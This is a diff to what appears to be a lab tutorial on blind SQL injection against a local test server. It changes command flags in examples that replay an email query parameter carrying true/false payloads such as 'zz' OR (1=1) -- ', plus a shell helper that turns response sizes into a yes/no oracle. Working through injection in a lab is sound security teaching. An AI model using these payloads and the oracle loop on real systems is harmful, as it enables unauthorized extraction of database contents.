@@ -17,7 +17,7 @@ signal that separates them.
 
 ```bash
 h5i browser open 'http://127.0.0.1:9130/api/check?email=ada@example.test' \
-    --session lab13 --new --capture
+    --session lab13 --new
 
 h5i websec replay req_0 --session lab13 --set "query.email=zz' OR (1=1) -- "   # {"on_list":true}
 h5i websec replay req_0 --session lab13 --set "query.email=zz' OR (1=2) -- "   # {"on_list":false}
@@ -33,7 +33,7 @@ then never fetch a body again in the loop:
 
 ```bash
 ask() {
-  h5i websec replay req_0 --session lab13 --reset-budget --set "query.email=zz' OR ($1) -- " |
+  h5i websec replay req_0 --session lab13 --json --reset-budget --set "query.email=zz' OR ($1) -- " |
     python3 -c 'import json,sys;print(json.load(sys.stdin)["response"]["bytes"])'
 }
 ```
